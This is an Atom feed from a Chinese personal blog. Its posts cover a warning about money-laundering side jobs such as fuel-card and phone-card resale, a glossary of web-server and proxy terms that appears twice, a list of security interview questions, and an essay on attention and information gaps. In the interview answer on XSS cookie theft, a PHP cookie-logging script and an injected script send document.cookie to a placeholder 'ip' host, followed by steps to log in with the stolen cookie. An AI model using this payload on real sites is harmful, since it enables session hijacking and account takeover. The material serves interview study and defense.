<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://wudi12138.github.io/Greeydi.github.io/</id>
    <title>Greeydi的个人博客</title>
    <updated>2022-06-05T14:30:36.374Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://wudi12138.github.io/Greeydi.github.io/"/>
    <link rel="self" href="https://wudi12138.github.io/Greeydi.github.io/atom.xml"/>
    <subtitle>  人生无常，择善而行</subtitle>
    <logo>https://wudi12138.github.io/Greeydi.github.io/images/avatar.png</logo>
    <icon>https://wudi12138.github.io/Greeydi.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Greeydi的个人博客</rights>
    <entry>
        <title type="html"><![CDATA[加油卡？电话卡？低价？转卖？]]></title>
        <id>https://wudi12138.github.io/Greeydi.github.io/post/di5/</id>
        <link href="https://wudi12138.github.io/Greeydi.github.io/post/di5/">
        </link>
        <updated>2022-06-05T13:50:47.000Z</updated>
        <content type="html"><![CDATA[<p>以下内容仅用作科普交流技术学习，本人不承担任何责任</p>
<p>本帖仅供了解学习，任何企图违法犯罪行为，请参考以下版面，自行负责，与本人无关。</p>
<p>在当下网络时代下，人们的价值观受到了极大冲击，网络成就了一批不该成功的人，再加上疫情对大家经济的影响，越来越多的人开始有赚快钱，捞偏门的想法，希望自己也能迅速赚大钱，而不是在时间里磨炼自己的技能和关注自己的提升，所以不法分子便有了可乘之机，于是我总结了目前离我们最近的四大比较普遍的灰产行业，望大家在以后的生活中遇见此类事情的时候，能有个好的分辨能力，不至于被动或主动的陷入进去。</p>
<p>目前比较火的四大灰产，分别是跑分，加油卡回收，电话卡回收，以及V推。</p>
<p>其中，跑分和石油卡以及电话卡回收都是属于洗黑钱的范畴，主要是帮境外所得的赌资，赃款及很多不合法资金（比如之前说到的短信嗅探得来的钱等等）洗钱。下面详细为大家介绍。</p>
<p>一：跑分</p>
<p>大家要清楚，跑分的本质就是洗钱！</p>
<p>所谓“跑分”，就是诈骗分子通过自建“跑分”平台，线上通过QQ群、微信群聊、论坛发帖，传播参与“跑分”项目链接。线下在地铁口、商场前用话术把“跑分”包装成一个门槛低、来钱快的网络项目，从而吸引贪图利益、风险防范意识淡薄的人成为代理人，欺骗诱导其出借个人微信或支付宝收款码。这些代理人向平台缴纳一定押金，然后用自己的网络收款码为平台代理收钱，还能抽取一定百分比的佣金。被骗者不断利用自己的网络支付收款码，替“跑分”平台代收款，赚取一定佣金，还沾沾自喜做着发财梦。殊不知，自己的收款码是在帮诈骗团伙洗钱，自己也成了协助洗钱者，成了违法犯罪的帮凶。</p>
<p>诈骗分子也会利用你的银行账户，进行各种转账，从而从每笔转账的金额中分你几个点的分成。以及当年十分火的支付宝商家付款账户，朋友圈里甚至有很多人花大几十万收一个这种账号，其实质就是不法分子利用这特性不断的进行洗钱操作。</p>
<p>近些年跑分的案例越来越多，大家还有什么不清楚的可以去网上搜搜关于跑分的案例，网上也有很多的这种违法事情被捕的案例，我重点讲讲后面这三种灰产的运行方式。</p>
<p>二：加油卡回收</p>
<p>随着近年来油价的上涨，不法分子便看上了加油卡这一行径。</p>
<figure data-type="image" tabindex="1"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1654439335872.jpeg" alt="" loading="lazy"></figure>
<p>在这里还是要多说一句，这也属于洗钱。不法分子会用赃款去通过途径购买中石化的加油卡，什么途径不为人知。（就算他用原价购得，再低价卖出去也能是一种洗钱方法）因为现在国内银行监控越来越严格，对支付宝和微信的监控也越发健全，于是不法分子便用到一款境外软件—欧易</p>
<figure data-type="image" tabindex="2"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1654439349658.png" alt="" loading="lazy"></figure>
<p>非法分子会把一张价值1000的中石化油卡以较低的价格，例如850左右卖给你，然后让你去欧易交易平台上购买BTC/USDT（泰达币，1USDT＝1美元），这种币的价值大概和美元差不多，然后你再把币打入到他的账户里，然后非法分子就会发给你油卡的卡号和卡密，并让你去闲鱼进行回收。（这里补充一下，为什么非法分子会用这种外币来进行交易，因为在央行的收付系统风控逐渐严格下，使用这种币能更方便受害者随时交易。而且也有为他洗钱的安全和隐蔽性做保障。）</p>
<figure data-type="image" tabindex="3"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1654439361507.png" alt="" loading="lazy"></figure>
<p>于是一张你花了大概850所购来的充值卡，转身就能得970元，短短几分钟内就能赚100+，所以这无疑会让很多不了解其中原因的人义无反顾的投入进去，从而间接的成为洗钱的帮凶！下面附带几张截图供大家了解。</p>
<figure data-type="image" tabindex="4"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1654439373643.png" alt="" loading="lazy"></figure>
<p>除此之外，有些国内的非法分子看到这种利益以后，但他苦于没有途径，他也会套用这种方法和话术，从而进行诈骗，目前已知衍生出来的诈骗方式有两种。</p>
<p>一是也会以低价的价格出售给你一张价值1000的中石化油卡，先让你尝到甜头，而后你再去购买的时候，他会以一张一张买太慢，或者系统无法发放等各种借口，从而诱导你一次买十张或者更多，当你把十张的钱转过去后他就会拉黑你，圈钱跑路！</p>
<p>二是也和上述方法一样，但他是在你转U币的时候，会发给你一下链接，用一些检查你账号是否正常或者核对你是否有能力购买这类理由，从而让你去点击这个链接，你一旦点击了这个链接，那么就会被他后台篡改交易，导致你账户里所有的币都会被他转走！</p>
<p>三：电话卡回收</p>
<p>这类洗钱的灰产黑产项目，大概操作方法和中石化加油卡差不多，这里我就不在详细赘述。</p>
<figure data-type="image" tabindex="5"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1654439389160.png" alt="" loading="lazy"></figure>
<p>大家一定要谨慎！一定要明白，洗钱是重罪，不管你获得的金额数量有多少，一旦确定你参与洗钱那都是要判刑的！</p>
<figure data-type="image" tabindex="6"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1654439424050.png" alt="" loading="lazy"></figure>
<p>尤其是一些大学生和宝妈们，稀里糊涂的就加入其中，酿成悲剧！</p>
<p>四：V推</p>
<p>这类灰产就是诈骗份子搞出来的，大概意思就是让你用微信去加人，然后会发你几段话，让你转发给你加的那个人，然后拍个视频就可以去领钱，一个人大概就有100左右。</p>
<p>这个就是典型的诈骗，他叫你所发的那些话其实也是类似于你收到的诈骗电话里面讲的那些话术，一定要警惕！</p>
<p>这也算是比较老的一种非法行为，警察们也侦破了很多此类案件，所以多的我就不说，如果在今后遇到此类兼职，一定要多留个心眼，多去网上搜一搜！</p>
<p>以上就是我对于灰产的解密，大家也不难看出，这一类产业有许多共同点，那就是轻松且来钱快，一天花个半个小时就能赚到五六百甚至更多，比起辛辛苦苦一个月打工要来的快不少。所以这就是不法分子能诱惑你的方法！</p>
<p>所以大家一定要擦亮双眼，特别是一些打着快速发财，轻松赚钱的幌子，对这些要尤为警惕！不要想着赚自己认知外的钱！踏踏实实，一点一滴的提升自己才是最有价值的！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[网络安全常识性名词（一）]]></title>
        <id>https://wudi12138.github.io/Greeydi.github.io/post/DI4/</id>
        <link href="https://wudi12138.github.io/Greeydi.github.io/post/DI4/">
        </link>
        <updated>2022-05-30T12:58:34.000Z</updated>
        <content type="html"><![CDATA[<pre><code>IIS：互联网信息服务（英语：Internet Information Services,简称IIS），是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。最初是WindowsNT版本的可选包，随后自带在Windows2000、Windows XP Professional和Windows Server 2003一起发布，但在普遍使用的Windows XP Home版本上并没有IIS。IIS是在Windows操作系统平台下开发的，这也限制了它只能在这种操作系统下运行。
相关缺陷：在Windows XP Professional中IIS的一些功能做出了限制，以与Windows Server 2003有所区隔。 [2] 
IIS的发展伴随着安全漏洞，而随着IIS6.0的发布，这种情况有所好转。在低于6.0的版本中，其权限是系统用户，而在IIS6.0中，引入了网络服务帐户，这是一个限制用户。这样，即使服务遭到了破坏，也不会造成系统的瘫痪。
在IIS 7.0中，IISRESET-reboot被移除。这代表无法通过此指令做电脑重启，但IISRESET的其他指令参数则功能照旧，不受影响。

Nginx: Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点（俄文：Рамблер）开发的，公开版本1.19.6发布于2020年12月15日。 [12] 其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、简单的配置文件和低系统资源的消耗而闻名。2022年01月25日，nginx 1.21.6发布。 [13] 
Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好。

反向代理：反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。同时，用户不需要知道目标服务器的地址，也无须在用户端作任何设定。反向代理服务器通常可用来作为Web加速，即使用反向代理作为Web服务器的前置机来降低网络和服务器的负载，提高访问效率。反向代理的工作原理是，代理服务器来接受客户端的网络访问连接请求，然后服务器将请求有策略的转发给网络中实际工作的业务服务器，并将从业务服务器处理的结果，返回给网络上发起连接请求的客户端。

代理服务器：代理服务器（Proxy Server）的功能是代理网络用户去取得网络信息。形象地说，它是网络信息的中转站，是个人网络和Internet服务商之间的中间代理机构，负责转发合法的网络信息，对转发进行控制和登记。 [1] 
代理服务器作为连接Internet与Intranet的桥梁，在实际应用中发挥着极其重要的作用，它可用于多个目的，最基本的功能是连接，此外还包括安全性、缓存、内容过滤、访问控制管理等功能。更重要的是，代理服务器是Internet链路级网关所提供的一种重要的安全功能，它的工作主要在开放系统互联（OSI）模型的对话层。 
主要分类：通过代理服务器共享上网从技术实现角度来说可以分为硬件共享上网和软件共享上网两种方式，从代理服务器工作的层次的角度来说可以分为应用层代理（应用层代理工作在TCP/IP模型的应用层之上，它只能用于支持代理的应用层协议（如HTTP，FTP）。）、传输层代理（传输层代理直接与TCP层交互，更加灵活。要求代理服务器具有部分真正服务器的功能：监听特定TCP或UDP端口，接收客户端的请求同时向客户端发出相应的响应。）和SOCKS代理（Socks是一个客户/服务器环境的代理协议。它包括两个主要的组件，Socks服务器和Socks客户库。Socks服务器实现在应用层，Socks客户库实现在客户的应用层与传输层之间。一个代理服务器为客户机与应用服务器建立连接，代理服务器在客户与应用服务器之间中转数据，从应用服务器的角度来看，代理服务器是客户。）。
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[网络安全常识性名词（一）]]></title>
        <id>https://wudi12138.github.io/Greeydi.github.io/post/wang-luo-an-quan-chang-shi-xing-ming-ci-yi/</id>
        <link href="https://wudi12138.github.io/Greeydi.github.io/post/wang-luo-an-quan-chang-shi-xing-ming-ci-yi/">
        </link>
        <updated>2022-05-30T12:58:34.000Z</updated>
        <content type="html"><![CDATA[<pre><code>IIS：互联网信息服务（英语：Internet Information Services,简称IIS），是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。最初是WindowsNT版本的可选包，随后自带在Windows2000、Windows XP Professional和Windows Server 2003一起发布，但在普遍使用的Windows XP Home版本上并没有IIS。IIS是在Windows操作系统平台下开发的，这也限制了它只能在这种操作系统下运行。
相关缺陷：在Windows XP Professional中IIS的一些功能做出了限制，以与Windows Server 2003有所区隔。 [2] 
IIS的发展伴随着安全漏洞，而随着IIS6.0的发布，这种情况有所好转。在低于6.0的版本中，其权限是系统用户，而在IIS6.0中，引入了网络服务帐户，这是一个限制用户。这样，即使服务遭到了破坏，也不会造成系统的瘫痪。
在IIS 7.0中，IISRESET-reboot被移除。这代表无法通过此指令做电脑重启，但IISRESET的其他指令参数则功能照旧，不受影响。

Nginx: Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点（俄文：Рамблер）开发的，公开版本1.19.6发布于2020年12月15日。 [12] 其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、简单的配置文件和低系统资源的消耗而闻名。2022年01月25日，nginx 1.21.6发布。 [13] 
Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好。

反向代理：反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。同时，用户不需要知道目标服务器的地址，也无须在用户端作任何设定。反向代理服务器通常可用来作为Web加速，即使用反向代理作为Web服务器的前置机来降低网络和服务器的负载，提高访问效率。反向代理的工作原理是，代理服务器来接受客户端的网络访问连接请求，然后服务器将请求有策略的转发给网络中实际工作的业务服务器，并将从业务服务器处理的结果，返回给网络上发起连接请求的客户端。

代理服务器：代理服务器（Proxy Server）的功能是代理网络用户去取得网络信息。形象地说，它是网络信息的中转站，是个人网络和Internet服务商之间的中间代理机构，负责转发合法的网络信息，对转发进行控制和登记。 [1] 
代理服务器作为连接Internet与Intranet的桥梁，在实际应用中发挥着极其重要的作用，它可用于多个目的，最基本的功能是连接，此外还包括安全性、缓存、内容过滤、访问控制管理等功能。更重要的是，代理服务器是Internet链路级网关所提供的一种重要的安全功能，它的工作主要在开放系统互联（OSI）模型的对话层。 
主要分类：通过代理服务器共享上网从技术实现角度来说可以分为硬件共享上网和软件共享上网两种方式，从代理服务器工作的层次的角度来说可以分为应用层代理（应用层代理工作在TCP/IP模型的应用层之上，它只能用于支持代理的应用层协议（如HTTP，FTP）。）、传输层代理（传输层代理直接与TCP层交互，更加灵活。要求代理服务器具有部分真正服务器的功能：监听特定TCP或UDP端口，接收客户端的请求同时向客户端发出相应的响应。）和SOCKS代理（Socks是一个客户/服务器环境的代理协议。它包括两个主要的组件，Socks服务器和Socks客户库。Socks服务器实现在应用层，Socks客户库实现在客户的应用层与传输层之间。一个代理服务器为客户机与应用服务器建立连接，代理服务器在客户与应用服务器之间中转数据，从应用服务器的角度来看，代理服务器是客户。）。
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[网络安全面试题目（一）]]></title>
        <id>https://wudi12138.github.io/Greeydi.github.io/post/DI3/</id>
        <link href="https://wudi12138.github.io/Greeydi.github.io/post/DI3/">
        </link>
        <updated>2022-05-30T12:43:47.000Z</updated>
        <content type="html"><![CDATA[<p>在面试时，网络安全也会被经常问到，至少要知道常见的攻击，以及防御措施。在这里 Mark 下，不做深入分析。</p>
<ol>
<li>
<p>对称加密和非对称加密<br>
对称加密：加解密用同一密钥，密钥维护复杂 n（n-1）/2，不适合互联网传输密钥，加解密效率高。应用于加密数据。<br>
非对称加密：公钥推不出私钥，每个用户一个非对称密钥对就可以，适合于互联网传输公钥，但是加密效低，应用于数字签名及加密。</p>
</li>
<li>
<p>什么是同源策略？<br>
为了防止不同域在用户浏览器中彼此干扰，浏览器对从不同来源（域）收到的内容进行隔离。浏览器不允许任何旧有脚本访问一个站点的 cookie，否则，会话容易被劫持。只有发布 cookie 的站点能够访问这些 cookie，只有通过该站点返回的页面所包含或加载的 JavaScript 才能访问 cookie。</p>
</li>
<li>
<p>cookie 存在哪里？可以打开吗？<br>
C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Cookies工具--文件夹选项--查看--将隐藏被保护的文件的对勾去掉就会看到 cookies 文件夹。</p>
</li>
<li>
<p>xss 如何盗取 cookie？<br>
攻击者代码：<br>
. <?php
.
. $cookie=$_GET['cookie'];
.
. $time=date('Y-m-d g:i:s');
.
. $referer=getenv('HTTP_REFERER');
.
. $cookietxt=fopen('cookie.txt','a');
.
. fwrite($cookietxt,"time:".$time." cookie:".$cookie."
referer:".$referer.""); 注意双引号，容易出错
.
. fclose($cookietxt);
.
. ?><br>
. 脚本端：<br>
. <script><br>
.<br>
. document.write('<img
src="http://ip/cookie.php?cookie='+document.cookie+'" width=0 height=0
border=0 />');<br>
.<br>
. </script><br>
. 获取到 cookie 后，用 firebug 找到 cookie，新建 cookie<br>
加入 cookie，用 referer 来提交，无需输入帐号密码直接登录进去！</p>
</li>
<li>
<p>xss 有 cookie 一定可以无用户名密码登录吗？<br>
基本可以。因为把 cookie 的值给浏览器，浏览器去访问页面会用已有的cookie 去访问，如果 cookie 有效，就会直接进去。</p>
</li>
<li>
<p>xss 如何防御？<br>
1.对前端输入做过滤和编码：比如只允许输入指定类型的字符，比如电话号格式，注册用户名限制等，输入检查需要在服务器端完成，在前端完成的限制是容易绕过的；对特殊字符进行过滤和转义；<br>
2.对输出做过滤和编码：在变量值输出到前端的 HTML 时进行编码和转义；<br>
3.给关键 cookie 使用 http-only。</p>
</li>
<li>
<p>SYN 攻击原理<br>
SYN 攻击属于 DOS 攻击的一种，它利用 TCP 协议缺陷，通过发送大量的半连接请求，耗费 CPU 和内存资源。SYN 攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上 SYN 攻击并不管目标是什么系统，只要这些系统打开 TCP 服务就可以实施。服务器接收到连接请求（SYN=1），将此信息加入未连接队列，并发送请求包给客户（syn=k,ack=j+1），此时进入 SYN_RECV 状态。当服务器未收到客户端的确认包时，重发请求包，一直到超时，才将此条目从未连接队列删除。配合 IP 欺骗，SYN 攻击能达到很好的效果，通常，客户端在短时间内伪造大量不存在的 IP 地址，向服务器不断地发送 syn 包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 SYN 包将长时间占用未连接队列，正常的 SYN 请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。</p>
</li>
<li>
<p>什么是网络钓鱼？<br>
网络钓鱼是通过大量发送声称来自于银行或其他知名机构的欺骗性垃圾邮件,意图引诱收信人给出敏感信息（如用户名、口令、帐号 ID 、ATMPIN 码或信用卡详细信息）的一种攻击方式。最典型的网络钓鱼攻击将收信人引诱到一个通过精心设计与目标组织的网站非常相似的钓鱼网站上，并获取收信人在此网站上输入的个人敏感信息，通常这个攻击过程不会让受害者警觉。它常常导引用户到 URL 与接口外观与真正网站几无二致的假冒网站输入个人数据。就算使用强式加密的 SSL 服务器认证，要侦测网站是否仿冒实际上仍很困难。网钓是一种利用社会工程技术来愚弄用户的实例。它凭恃的是现行网络安全技术的低亲和度。</p>
</li>
<li>
<p>DDOS<br>
分布式拒绝服务(DDoS:Distributed Denial ofService)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS 攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将 DDoS 主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p>
</li>
<li>
<p>什么是 CC 攻击？<br>
这个也是知道一些，知道他是 DDos 的变种，正常请求伪造，服务器资源耗尽，最终还是看看百科答案吧：CC 攻击是 DDOS（分布式拒绝服务）的一种，相比其它的 DDOS 攻击 CC 似乎更有技术含量一些。这种攻击你见不到真实源 IP，见不到特别大的异常流量，但造成服务器无法进行正常连接。CC 攻击的原理就是攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。CC 主要是用来攻击页面的，每个人都有这样的体验：当一个网页访问的人数特别多的时候，打开网页就慢了，CC 就是模拟多个用户（多少线程就是多少用户）不停地进行访问那些需要大量数据操作（就是需要大量 CPU 时间）的页面，造成服务器资源的浪费，CPU 长时间处于 100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。</p>
</li>
<li>
<p>Web 服务器被入侵后，怎样进行排查？<br>
最简单就是<br>
 查看下 web 服务器日志<br>
 看看有没有异常端口开放<br>
 使用安全狗等服务器安全软件清扫</p>
</li>
<li>
<p>dll 文件是什么意思，有什么用？<br>
DLL（Dynamic Link Library）文件，即动态链接库，也有人称作应用程序拓展。Windows 应用程序中，实行了模块化设计，也就是说并不是每个应用程序都编写完所有的功能代码，而是在运行过程中调用相应功能的 DLL，不需运行的功能就不调用，所以大大加快了程序的加载速度和效率，其他应用程序也可以调用相关的 DLL，这样也有利于促进代码重用以及内存使用效率，减少了资源占用，而且程序更新时也只要更新相关的 DLL 就可以了。要注意的是，有些病毒也会伪装成 DLL 文件，并替换系统的 DLL 文件，需要我们防范。</p>
</li>
<li>
<p>DLL 劫持原理<br>
由于输入表中只包含 DLL 名而没有它的路径名，因此加载程序必须在磁盘上搜索 DLL 文件。首先会尝试从当前程序所在的目录加载 DLL，如果没找到，则在 Windows 系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的 DLL，提供同样的输出表，每个输出函数转向真正的系统 DLL。程序调用系统 DLL 时会先调用当前目录下伪造的 DLL，完成相关功能后，再跳到系统 DLL 同名函数里执行。这个过程用个形象的词来描述就是系统 DLL 被劫持（hijack）了。伪造的 dll 制作好后，放到程序当前目录下，这样当原程序调用原函数时就调用了伪造的 dll 的同名函数，进入劫持 DLL 的代码，处理完毕后，再调用原DLL 此函数。</p>
</li>
<li>
<p>如何防止 DLL 劫持<br>
DLL 劫持利用系统未知 DLL 的搜索路径方式，使得程序加载当前目录下的系统同名 DLL。所以可以告诉系统 DLL 的位置，改变加载系统 DLL 的顺序不是当前目录，而是直接到系统目录下查找。</p>
</li>
<li>
<p>Https 的作用<br>
 内容加密建立一个信息安全通道，来保证数据传输的安全；<br>
 身份认证确认网站的真实性<br>
 数据完整性防止内容被第三方冒充或者篡改</p>
</li>
<li>
<p>HTTPS 和 HTTP 的区别：<br>
  https 协议需要到 CA 申请证书。<br>
 http 是超文本传输协议，信息是明文传输；https 则是具有安全性的 ssl 加密传输协议。<br>
 http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。<br>
 http 的连接很简单，是无状态的；HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议，比 http 协议安全。</p>
</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[资本的追逐点？信息差？跨学科？]]></title>
        <id>https://wudi12138.github.io/Greeydi.github.io/post/DI2/</id>
        <link href="https://wudi12138.github.io/Greeydi.github.io/post/DI2/">
        </link>
        <updated>2022-05-30T12:20:02.000Z</updated>
        <summary type="html"><![CDATA[<p>相信很多人会回答：利益，资本在追逐利益。</p>
<p>有些人可能会解释，资本是资源的错配与调用</p>
<p>但是资本所追逐的的点，追逐的是能够确实性的收益。</p>
<p>那么这些收益怎么来呢？</p>
<p>来自信息差</p>
<p>信息是引导人关注的东西，人的注意力无论出于什么目的，往往都会聚焦在他认为有价值的信息上。</p>
<p>因此，注意力其实是一个信息背后所隐藏的真正启发点与关键点。</p>
<p>历史书中，记载了过往王朝中当局者所希望让后人看到的“历史“，</p>
<p>这就是为什么不会有历史学家只靠读了几本知名度高的历史书就能完成研究的。一定是参照野史，调研，访谈记录，历史古迹等等蛛丝马迹，去尝试还原一个具有高概率发生的真实过去。</p>
<p>追逐这些正史的人，任何时代其实都有，你以为王朝所谓的历史撰写者他们不知道吗？并不，即便焚书坑儒也绝对无法限制100％的传播，但他们知道只要让绝大多数人看到的是他们所写的，并把他们的内容教授给后代。</p>
<p>毕竟绝大多数人的注意力难道还不容易颠倒是非吗？过去我们看报纸、听广播，后来家家每晚晚饭时间凑在电视机前看新闻联播。电脑则是从BBS信息门户时代走向了信息检索，人们可以主动搜寻自己想要看到的信息。</p>
<p>到了手机移动端，更是诞生了各大APP。最后，到了我们现在的时代，流媒体，也就是视频，看似信息足够多，你可以主动搜索世间绝大多数你想要的信息。</p>
<p>可是，你试着回答这样一个问题：请你不用百度，谷歌，微博，贴吧，b站等等耳熟能详的平台去找一下三国时代郭嘉的生辰。</p>
<p>看似简单的问题，可能，部分人需要翻书。</p>
<p>所以你看似主动性强，但你很难逃离这些上层建筑，而你要知道在商业化的驱使下，任何具备流量资源的位置，都是非常值钱的。你所看到的现在你还能确定不是某些人想让你看到的吗？</p>
<p>三个要素是吸引到流量的关键的：1.猎奇、新颖，2.具备教育价值的（比如知识类视频），3.使人共情的（无论是心理学或是日常分享），它满足了观众的被感知。</p>
<p>现在，我们便发现视频是当今社会承载注意力的关键，而如何把注意力玩起来其实才是我们能够加以反思获得成长，甚至是突破自己的核心。</p>
<p>你可能会发现，时至今日，其实很多官方账号的粉丝量也不过几十万甚至只有几万，这就延伸出一个问题：官方性质相比个人会处于明显劣势吗？</p>
<p>我想多半是的，一方面，官方受制于上层压力，一定是相对保守的出牌，这导致内容欠缺张力，另一方面，官方是具备公众的认知基础的，能够打破群众的固有认知其实是一件很不容易的事，甚至可能会成为一步险棋。</p>
<p>官方所欠缺人格所散发的特殊魅力，并且它也很难把集团的标志定格在人的魅力上，因为这也是具有风险的。</p>
<p>当然也有做得很出色的。但这些都很难离开精心的策划以及的确赶上了潮流</p>
<p>其实很多时候，思维会被限制在自己的学识领域里，认可更多的是在相同环境下的群体，大家所认可的事物。</p>
<p>但其实退后一步海阔天空，生活为什么被卷飞？因为自己与身边的人都在一个已经被设定好的规则中进行游戏。你我所认同认知的便是老师家长眼中的成绩、领导下发的绩效甚至是朋友之间对新热点的关注。</p>
<p>在这样的的规则下，大家的目光便会不由自主地看向那个最高处。</p>
<p>因为你无论如何都很难打破固有的受众圈层，无论你在哪个领域之间有多专业，大家相互之间，其实底层的原理差不多的，无非是差异于行业的逻辑罢了。</p>
<p>跨学科</p>
<p>多关注自己，发展自己</p>
<p>要知道，任何时代，未知的新机会往往就诞生于这些推翻现有规则设定者的框架，看似还未吸引主流注意力的事物之上。</p>
]]></summary>
        <content type="html"><![CDATA[<p>相信很多人会回答：利益，资本在追逐利益。</p>
<p>有些人可能会解释，资本是资源的错配与调用</p>
<p>但是资本所追逐的的点，追逐的是能够确实性的收益。</p>
<p>那么这些收益怎么来呢？</p>
<p>来自信息差</p>
<p>信息是引导人关注的东西，人的注意力无论出于什么目的，往往都会聚焦在他认为有价值的信息上。</p>
<p>因此，注意力其实是一个信息背后所隐藏的真正启发点与关键点。</p>
<p>历史书中，记载了过往王朝中当局者所希望让后人看到的“历史“，</p>
<p>这就是为什么不会有历史学家只靠读了几本知名度高的历史书就能完成研究的。一定是参照野史，调研，访谈记录，历史古迹等等蛛丝马迹，去尝试还原一个具有高概率发生的真实过去。</p>
<p>追逐这些正史的人，任何时代其实都有，你以为王朝所谓的历史撰写者他们不知道吗？并不，即便焚书坑儒也绝对无法限制100％的传播，但他们知道只要让绝大多数人看到的是他们所写的，并把他们的内容教授给后代。</p>
<p>毕竟绝大多数人的注意力难道还不容易颠倒是非吗？过去我们看报纸、听广播，后来家家每晚晚饭时间凑在电视机前看新闻联播。电脑则是从BBS信息门户时代走向了信息检索，人们可以主动搜寻自己想要看到的信息。</p>
<p>到了手机移动端，更是诞生了各大APP。最后，到了我们现在的时代，流媒体，也就是视频，看似信息足够多，你可以主动搜索世间绝大多数你想要的信息。</p>
<p>可是，你试着回答这样一个问题：请你不用百度，谷歌，微博，贴吧，b站等等耳熟能详的平台去找一下三国时代郭嘉的生辰。</p>
<p>看似简单的问题，可能，部分人需要翻书。</p>
<p>所以你看似主动性强，但你很难逃离这些上层建筑，而你要知道在商业化的驱使下，任何具备流量资源的位置，都是非常值钱的。你所看到的现在你还能确定不是某些人想让你看到的吗？</p>
<p>三个要素是吸引到流量的关键的：1.猎奇、新颖，2.具备教育价值的（比如知识类视频），3.使人共情的（无论是心理学或是日常分享），它满足了观众的被感知。</p>
<p>现在，我们便发现视频是当今社会承载注意力的关键，而如何把注意力玩起来其实才是我们能够加以反思获得成长，甚至是突破自己的核心。</p>
<p>你可能会发现，时至今日，其实很多官方账号的粉丝量也不过几十万甚至只有几万，这就延伸出一个问题：官方性质相比个人会处于明显劣势吗？</p>
<p>我想多半是的，一方面，官方受制于上层压力，一定是相对保守的出牌，这导致内容欠缺张力，另一方面，官方是具备公众的认知基础的，能够打破群众的固有认知其实是一件很不容易的事，甚至可能会成为一步险棋。</p>
<p>官方所欠缺人格所散发的特殊魅力，并且它也很难把集团的标志定格在人的魅力上，因为这也是具有风险的。</p>
<p>当然也有做得很出色的。但这些都很难离开精心的策划以及的确赶上了潮流</p>
<p>其实很多时候，思维会被限制在自己的学识领域里，认可更多的是在相同环境下的群体，大家所认可的事物。</p>
<p>但其实退后一步海阔天空，生活为什么被卷飞？因为自己与身边的人都在一个已经被设定好的规则中进行游戏。你我所认同认知的便是老师家长眼中的成绩、领导下发的绩效甚至是朋友之间对新热点的关注。</p>
<p>在这样的的规则下，大家的目光便会不由自主地看向那个最高处。</p>
<p>因为你无论如何都很难打破固有的受众圈层，无论你在哪个领域之间有多专业，大家相互之间，其实底层的原理差不多的，无非是差异于行业的逻辑罢了。</p>
<p>跨学科</p>
<p>多关注自己，发展自己</p>
<p>要知道，任何时代，未知的新机会往往就诞生于这些推翻现有规则设定者的框架，看似还未吸引主流注意力的事物之上。</p>
<!-- more -->
<figure data-type="image" tabindex="1"><img src="https://wudi12138.github.io/Greeydi.github.io//post-images/1653913346448.jpg" alt="" loading="lazy"></figure>
<p>自己在生活中对积累事物的认知，去思考搭建更成熟的逻辑框架，当然这也会成为我未来不断前行不断学习的动力。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[你的位置？一张照片?]]></title>
        <id>https://wudi12138.github.io/Greeydi.github.io/post/DI/</id>
        <link href="https://wudi12138.github.io/Greeydi.github.io/post/DI/">
        </link>
        <updated>2022-05-30T12:03:38.000Z</updated>
        <content type="html"><![CDATA[<p>一张照片查出你的拍摄地点</p>
